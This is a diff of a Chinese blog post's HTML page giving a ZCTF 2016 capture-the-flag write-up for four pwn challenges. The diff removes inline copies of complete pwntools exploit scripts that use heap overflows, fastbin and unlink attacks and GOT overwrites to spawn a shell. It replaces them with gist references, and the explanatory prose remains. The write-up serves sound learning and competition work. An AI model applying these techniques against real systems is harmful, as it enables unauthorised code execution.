@@ -6,13 +6,13 @@
 <meta charset="utf-8">
 <meta name="theme-color" content="#000000">
 <title>Writeup: ZCTF – 盘子里的部落格</title>
-<meta name="description" content="2016 年第一篇 blog! 这次只做出两道 pwn, 好忧伤… guess 在最近的 32c3ctf 中出现过一道类似的 readme1. 就是把argv[1]改成目的字符串位置，可以在 libc 打出错误信息的时候，被当作文件名打印出来。 #!/usr/bin/env python # coding=utf8 from pwn import p64, remote p = remote('115.28.27.103', 22222) flag_addr = 0x6010c0 p.sendline('ZCTF{' + '\x01'*29 + '\x00'*262 + p64(flag_addr+5)) p.recvuntil('***: ') xored_flag = p.recv(29) print 'ZCTF{' + ''.join([chr(ord(i) ^ 1) for i in xored_flag]) Loading gist... note1 这题的 note 是以链表形式储存的，堆溢出（edit 存在溢出漏洞）之后可以覆盖地址更改链表结构。我的 exp 思路就是先把一个 note 指向setvbuf()的 got, 然后用 show 把地址 leak 出来，这样可以 offset 到system(). 然后再将另一个 note 地址改到strcmp()的 got,...">
+<meta name="description" content="2016 年第一篇 blog! 这次只做出两道 pwn, 好忧伤… guess 在最近的 32c3ctf 中出现过一道类似的 readme1. 就是把argv[1]改成目的字符串位置，可以在 libc 打出错误信息的时候，被当作文件名打印出来。 Gist: cubarco/cbbd4ab5462c2f0f287b note1 这题的 note 是以链表形式储存的，堆溢出（edit 存在溢出漏洞）之后可以覆盖地址更改链表结构。我的 exp 思路就是先把一个 note 指向setvbuf()的 got, 然后用 show 把地址 leak 出来，这样可以 offset 到system(). 然后再将另一个 note 地址改到strcmp()的 got, 通过 edit 把内容改成system()的地址。最后调用strcmp(), title 填/bin/sh就可以了。 Gist: cubarco/30a44a61252f448964c4 note2 这题在赛时没找到漏洞，赛后看了 FlappyPig 的 Writeup2, 只是简单的 fastbin, 感觉好可惜… 360 安全播报给的代码没缩进根本不能看，自己重新写了个。 Gist: cubarco/9752fbbe78a071b04b37 note3 这题同样是没有在赛时做出来，但是与 note2 相反，这题我是找到了两个可以利用的漏洞的(一个是 integer overflow, 另一个是可以增加第八个 note), 但是不知道如何利用。我在比赛的时候一直想着怎么 fastbin, 因为我觉得 unlink 这么古老的 exp 肯定已经不能用了… 没想到这题的环境刚好适合 unlink, 有点可惜。赛后看了 FlappyPig...">
 <meta name="keywords" content="Hack, CTF, Writeup, Exploitation, PWN">
 
 
 <!-- Twitter Cards -->
 <meta name="twitter:title" content="Writeup: ZCTF">
-<meta name="twitter:description" content="2016 年第一篇 blog! 这次只做出两道 pwn, 好忧伤… guess 在最近的 32c3ctf 中出现过一道类似的 readme1. 就是把argv[1]改成目的字符串位置，可以在 libc 打出错误信息的时候，被当作文件名打印出来。 #!/usr/bin/env python # coding=utf8 from pwn import p64, remote p = remote('115.28.27.103', 22222) flag_addr = 0x6010c0 p.sendline('ZCTF{' + '\x01'*29 + '\x00'*262 + p64(flag_addr+5)) p.recvuntil('***: ') xored_flag = p.recv(29) print 'ZCTF{' + ''.join([chr(ord(i) ^ 1) for i in xored_flag]) Loading gist... note1 这题的 note 是以链表形式储存的，堆溢出（edit 存在溢出漏洞）之后可以覆盖地址更改链表结构。我的 exp 思路就是先把一个 note 指向setvbuf()的 got, 然后用 show 把地址 leak 出来，这样可以 offset 到system(). 然后再将另一个 note 地址改到strcmp()的 got,...">
+<meta name="twitter:description" content="2016 年第一篇 blog! 这次只做出两道 pwn, 好忧伤… guess 在最近的 32c3ctf 中出现过一道类似的 readme1. 就是把argv[1]改成目的字符串位置，可以在 libc 打出错误信息的时候，被当作文件名打印出来。 Gist: cubarco/cbbd4ab5462c2f0f287b note1 这题的 note 是以链表形式储存的，堆溢出（edit 存在溢出漏洞）之后可以覆盖地址更改链表结构。我的 exp 思路就是先把一个 note 指向setvbuf()的 got, 然后用 show 把地址 leak 出来，这样可以 offset 到system(). 然后再将另一个 note 地址改到strcmp()的 got, 通过 edit 把内容改成system()的地址。最后调用strcmp(), title 填/bin/sh就可以了。 Gist: cubarco/30a44a61252f448964c4 note2 这题在赛时没找到漏洞，赛后看了 FlappyPig 的 Writeup2, 只是简单的 fastbin, 感觉好可惜… 360 安全播报给的代码没缩进根本不能看，自己重新写了个。 Gist: cubarco/9752fbbe78a071b04b37 note3 这题同样是没有在赛时做出来，但是与 note2 相反，这题我是找到了两个可以利用的漏洞的(一个是 integer overflow, 另一个是可以增加第八个 note), 但是不知道如何利用。我在比赛的时候一直想着怎么 fastbin, 因为我觉得 unlink 这么古老的 exp 肯定已经不能用了… 没想到这题的环境刚好适合 unlink, 有点可惜。赛后看了 FlappyPig...">
 <meta name="twitter:site" content="@Cube_Lin">
 <meta name="twitter:creator" content="@Cube_Lin">
 
@@ -25,7 +25,7 @@
 <meta property="og:locale" content="zh_CN">
 <meta property="og:type" content="article">
 <meta property="og:title" content="Writeup: ZCTF">
-<meta property="og:description" content="2016 年第一篇 blog! 这次只做出两道 pwn, 好忧伤… guess 在最近的 32c3ctf 中出现过一道类似的 readme1. 就是把argv[1]改成目的字符串位置，可以在 libc 打出错误信息的时候，被当作文件名打印出来。 #!/usr/bin/env python # coding=utf8 from pwn import p64, remote p = remote('115.28.27.103', 22222) flag_addr = 0x6010c0 p.sendline('ZCTF{' + '\x01'*29 + '\x00'*262 + p64(flag_addr+5)) p.recvuntil('***: ') xored_flag = p.recv(29) print 'ZCTF{' + ''.join([chr(ord(i) ^ 1) for i in xored_flag]) Loading gist... note1 这题的 note 是以链表形式储存的，堆溢出（edit 存在溢出漏洞）之后可以覆盖地址更改链表结构。我的 exp 思路就是先把一个 note 指向setvbuf()的 got, 然后用 show 把地址 leak 出来，这样可以 offset 到system(). 然后再将另一个 note 地址改到strcmp()的 got,...">
+<meta property="og:description" content="2016 年第一篇 blog! 这次只做出两道 pwn, 好忧伤… guess 在最近的 32c3ctf 中出现过一道类似的 readme1. 就是把argv[1]改成目的字符串位置，可以在 libc 打出错误信息的时候，被当作文件名打印出来。 Gist: cubarco/cbbd4ab5462c2f0f287b note1 这题的 note 是以链表形式储存的，堆溢出（edit 存在溢出漏洞）之后可以覆盖地址更改链表结构。我的 exp 思路就是先把一个 note 指向setvbuf()的 got, 然后用 show 把地址 leak 出来，这样可以 offset 到system(). 然后再将另一个 note 地址改到strcmp()的 got, 通过 edit 把内容改成system()的地址。最后调用strcmp(), title 填/bin/sh就可以了。 Gist: cubarco/30a44a61252f448964c4 note2 这题在赛时没找到漏洞，赛后看了 FlappyPig 的 Writeup2, 只是简单的 fastbin, 感觉好可惜… 360 安全播报给的代码没缩进根本不能看，自己重新写了个。 Gist: cubarco/9752fbbe78a071b04b37 note3 这题同样是没有在赛时做出来，但是与 note2 相反，这题我是找到了两个可以利用的漏洞的(一个是 integer overflow, 另一个是可以增加第八个 note), 但是不知道如何利用。我在比赛的时候一直想着怎么 fastbin, 因为我觉得 unlink 这么古老的 exp 肯定已经不能用了… 没想到这题的环境刚好适合 unlink, 有点可惜。赛后看了 FlappyPig...">
 <meta property="og:url" content="https://cubarco.org/blog/2016/01/writeup-zctf/">
 <meta property="og:site_name" content="盘子里的部落格">
 
@@ -193,248 +193,25 @@
 
 <p>在最近的 32c3ctf 中出现过一道类似的 readme<sup id="fnref:1"><a href="#fn:1" class="footnote">1</a></sup>. 就是把<code class="highlighter-rouge">argv[1]</code>改成目的字符串位置，可以在 libc 打出错误信息的时候，被当作文件名打印出来。</p>
 
-<noscript><pre>#!/usr/bin/env python
-# coding=utf8
-
-from pwn import p64, remote
-
-p = remote('115.28.27.103', 22222)
-
-flag_addr = 0x6010c0
-
-p.sendline('ZCTF{' + '\x01'*29 + '\x00'*262 + p64(flag_addr+5))
-
-p.recvuntil('***: ')
-xored_flag = p.recv(29)
-
-print 'ZCTF{' + ''.join([chr(ord(i) ^ 1) for i in xored_flag])</pre></noscript>
-<div class="gist" data-gist="cubarco/cbbd4ab5462c2f0f287b">Loading gist...</div>
+<div class="gist" data-gist="cubarco/cbbd4ab5462c2f0f287b">Gist: cubarco/cbbd4ab5462c2f0f287b</div>
 
 <h2 id="note1">note1</h2>
 
 <p>这题的 note 是以链表形式储存的，堆溢出（edit 存在溢出漏洞）之后可以覆盖地址更改链表结构。我的 exp 思路就是先把一个 note 指向<code class="highlighter-rouge">setvbuf()</code>的 got, 然后用 show 把地址 leak 出来，这样可以 offset 到<code class="highlighter-rouge">system()</code>. 然后再将另一个 note 地址改到<code class="highlighter-rouge">strcmp()</code>的 got, 通过 edit 把内容改成<code class="highlighter-rouge">system()</code>的地址。最后调用<code class="highlighter-rouge">strcmp()</code>, title 填<code class="highlighter-rouge">/bin/sh</code>就可以了。</p>
 
-<noscript><pre>#!/usr/bin/env python
-# coding=utf8
-
-from pwn import p64, ELF, process, remote
-from struct import unpack
-from time import sleep
-
-# p = process('./note1')
-p = remote('115.28.27.103', 9001)
-elf = ELF('./libc-2.19.so')
-
-strcmp_got = 0x602048
-setvbuf_got = 0x602060
-system_offset_to_setvbuf = elf.symbols['system'] - elf.symbols['setvbuf']
-
-p.sendline('1')
-p.sendline('1')
-p.sendline('1')
-p.sendline('1')
-
-p.sendline('1')
-p.sendline('2')
-p.sendline('2')
-p.sendline('2')
-
-p.sendline('1')
-p.sendline('3')
-p.sendline('3')
-p.sendline('3')
-
-# edit the first note to make heap overflow then leak stack address(setvbuf)
-p.sendline('3')
-p.sendline('1')
-p.sendline('A' * 280 + p64(setvbuf_got - 0x70) + '2')
-
-p.sendline('2')
-
-p.recvuntil('content=')
-p.recvuntil('content=')
-p.recvuntil('content=')
-
-setvbuf_addr = unpack('Q', p.recv(6) + '\x00'*2)[0]
-print '[*] setvbuf_addr: ' + hex(setvbuf_addr)
-
-# edit the second note to modify the strcmp_got to system
-p.sendline('3')
-p.sendline('2')
-p.sendline('A' * 280 + p64(strcmp_got - 0x70) + '3')
-
-p.sendline('3')
-p.sendline('\x00')
-p.sendline(p64(setvbuf_addr + system_offset_to_setvbuf))
-
-# trigger strcmp
-p.sendline('3')
-p.sendline('/bin/sh')
-
-sleep(0.1)
-p.clean()
-
-p.interactive()</pre></noscript>
-<div class="gist" data-gist="cubarco/30a44a61252f448964c4">Loading gist...</div>
+<div class="gist" data-gist="cubarco/30a44a61252f448964c4">Gist: cubarco/30a44a61252f448964c4</div>
 
 <h2 id="delnote2del"><del>note2</del></h2>
 
 <p>这题在赛时没找到漏洞，赛后看了 FlappyPig 的 Writeup<sup id="fnref:2"><a href="#fn:2" class="footnote">2</a></sup>, 只是简单的 fastbin, 感觉好可惜… 360 安全播报给的代码没缩进根本不能看，自己重新写了个。</p>
 
-<noscript><pre>#!/usr/bin/env python
-# coding=utf8
-
-from pwn import process, ELF, p64
-from struct import unpack
-
-# elf = ELF('./libc-2.19.so')
-elf = ELF('/lib64/libc.so.6')
-p = process('./note2')
-
-name_bss = 0x6020e0
-atoi_got = 0x602088
-system_offset_to_atoi = elf.symbols['system'] - elf.symbols['atoi']
-
-
-def add_note(size, content=None):
-    p.sendline('1')
-    p.sendline(str(size))
-    if content:
-        p.sendline(content)
-
-
-def show_note(index):
-    p.sendline('2')
-    p.sendline(str(index))
-
-
-def edit_note(index, mode, content):
-    p.sendline('3')
-    p.sendline(str(index))
-    p.sendline(str(mode))
-    p.sendline(content)
-
-
-def delete_note(index):
-    p.sendline('4')
-    p.sendline(str(index))
-
-
-if __name__ == '__main__':
-    # name
-    p.sendline(p64(0) + p64(0x21) + 'A' * 0x10 + p64(0) + p64(0x21))
-    p.sendline('address')
-
-    # heap overflow and modify the address malloced in edit function
-    # then the fake chunk will be freed and appended to fastbin
-    add_note(0, 'A'*15)  # leave one zero byte for appending
-    add_note(0x80, 'A')
-    for _ in range(7):
-        edit_note(0, 2, 'A' * 0x10)
-    edit_note(0, 2, 'A' + p64(name_bss + 0x10))
-
-    # malloc the fake chunk in name
-    add_note(0, 'A'*0x10)
-    edit_note(2, 2, 'A'*(0x20-1))  # leave one zero byte for appending
-    edit_note(2, 2, 'A' + p64(atoi_got))  # modify the address of first note
-    show_note(0)
-    p.recvuntil('Content is ')
-
-    atoi_addr = unpack('Q', p.recv(6).ljust(8, '\x00'))[0]
-    print '[*] atoi_addr: 0x%x' % atoi_addr
-    system_addr = atoi_addr + system_offset_to_atoi
-    print '[*] system_addr: 0x%x' % system_addr
-
-    edit_note(0, 1, p64(system_addr))
-    p.sendline('/bin/sh')
-
-    p.clean()
-    p.interactive()</pre></noscript>
-<div class="gist" data-gist="cubarco/9752fbbe78a071b04b37">Loading gist...</div>
+<div class="gist" data-gist="cubarco/9752fbbe78a071b04b37">Gist: cubarco/9752fbbe78a071b04b37</div>
 
 <h2 id="delnote3del"><del>note3</del></h2>
 
 <p>这题同样是没有在赛时做出来，但是与 note2 相反，这题我是找到了两个可以利用的漏洞的(一个是 integer overflow, 另一个是可以增加第八个 note), 但是不知道如何利用。我在比赛的时候一直想着怎么 fastbin, 因为我觉得 unlink 这么古老的 exp 肯定已经不能用了… 没想到这题的环境刚好适合 unlink, 有点可惜。赛后看了 FlappyPig 的 Writeup<sup id="fnref:2:1"><a href="#fn:2" class="footnote">2</a></sup>, 自己重新写了个 exp, 也算是复习一下 unlink.</p>
 
-<noscript><pre>#!/usr/bin/env python
-# coding=utf8
-
-from pwn import p64, u64, process, ELF
-
-elf = ELF('/lib64/libc.so.6')
-# elf = ELF('./libc-2.19.so')
-p = process('./note3')
-
-free_got = 0x602018
-atoi_got = 0x602070
-puts_plt = 0x400730
-system_offset_to_atoi = elf.symbols['system'] - elf.symbols['atoi']
-
-
-def add_note(size, content):
-    p.sendline('1')
-    p.sendline(str(size))
-    p.sendline(content)
-
-
-def edit_note(index, content):
-    p.sendline('3')
-    p.sendline(str(index))
-    p.sendline(content)
-
-
-def delete_note(index):
-    p.sendline('4')
-    p.sendline(str(index))
-
-
-if __name__ == '__main__':
-    for _ in range(7):
-        # add note0 ... note6
-        add_note(0x80, '')
-
-    # make note3 active
-    edit_note(3, '')
-
-    note3_ptr = 0x6020c8 + 3 * 8
-
-    # prepare fake previous chunk and overflow to note4 chunk
-    payload = p64(0)  # size
-    payload += p64(0x80 + 1)  # prev_size
-    payload += p64(note3_ptr - 3 * 8)  # FD  (note3_ptr - 3*8 = note0_ptr)
-    payload += p64(note3_ptr - 2 * 8)  # BK
-    payload += 'A' * (0x80 - 4*8)  # junk
-    payload += p64(0x80)  # note4_chunk_pre_size
-    payload += p64(0x80 + 2 * 8)  # note4_chunk_size
-
-    # integer overflow
-    edit_note(-0x8000000000000000, payload)
-
-    # delete note4 and unlink fake chunk
-    delete_note(4)
-    # now note3_ptr = note0_ptr
-
-    # modify note0_ptr to free_got and note1_ptr, note2_ptr to atoi_got
-    edit_note(3, p64(free_got) + p64(atoi_got) + p64(atoi_got)[:-1])
-    edit_note(0, p64(puts_plt)[:-1])
-
-    p.clean()
-    delete_note(1)  # leak atoi
-    p.recvuntil('Input the id of the note:\n')
-
-    atoi_addr = u64(p.recv(6).ljust(8, '\x00'))
-    system_addr = atoi_addr + system_offset_to_atoi
-    print '[*] system_addr: 0x%x' % system_addr
-
-    # modify note2_ptr(atoi_got) to system_addr
-    edit_note(2, p64(system_addr)[:-1])
-
-    # trigger atoi(now system)
-    p.sendline('/bin/sh')
-
-    p.clean()
-    p.interactive()</pre></noscript>
-<div class="gist" data-gist="cubarco/ababdac123a4762c0180">Loading gist...</div>
+<div class="gist" data-gist="cubarco/ababdac123a4762c0180">Gist: cubarco/ababdac123a4762c0180</div>
 
 <h2 id="references">References</h2>
 
